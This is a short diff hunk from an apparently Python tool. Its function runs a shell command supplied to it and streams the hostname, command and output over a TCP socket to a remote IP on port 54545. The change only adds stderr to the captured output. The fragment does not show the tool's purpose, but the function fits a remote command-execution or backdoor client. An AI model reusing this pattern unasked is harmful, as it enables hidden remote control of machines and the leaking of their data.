@@ -62,7 +62,7 @@ def run_and_transmit(ip:str, com:str):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((ip, 54545))
     s.send(f"output\n{first_token + hostname}.output\n\nTime: {ts} Command: {com}\n\n".encode())
-    proc = subprocess.Popen(com, shell=True, stdout=subprocess.PIPE)
+    proc = subprocess.Popen(com, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
     for line in proc.stdout:
         print(line.decode().strip())
         s.send(line)
